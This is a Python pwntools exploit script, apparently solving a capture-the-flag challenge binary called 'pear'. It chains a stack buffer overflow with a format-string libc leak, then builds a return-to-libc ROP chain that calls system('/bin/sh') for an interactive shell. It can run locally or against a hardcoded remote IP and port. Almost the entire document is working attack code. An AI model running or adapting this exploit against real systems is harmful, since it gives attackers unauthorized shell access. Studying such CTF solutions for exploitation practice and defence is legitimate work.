#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('pear_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

if args.REMOTE:
    p = remote('65.109.198.121', 5000)
else:
    p = process([exe.path])

ret = 0x000000000040101a
payload = flat(
    b'A'* 0x80,
    0,
    ret,
    exe.plt.gets,
    exe.plt.gets,
    exe.plt.printf,
    exe.sym.main
)
sleep(1)
sla(p, b'name: ', payload)
# GDB()
p.sendline(b'aaa')
p.sendline(b"%11$" + p8(u8(b"p")+1) + b"sh")
p.recvuntil(b'A'*0x80+b'\n')
leak_libc = int(p.recv(14), 16)
info('LEAK LIBC: ' + hex(leak_libc))
libc.address = leak_libc - 0x24e000
pop_rdi = libc.address + 0x10f75b
info('LIBC BASE: ' + hex(libc.address))
payload = flat(
    b'A'* 0x80,
    0,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    ret,
    libc.sym.system
)
sleep(1)
sla(p, b'name: ', payload)
p.interactive()
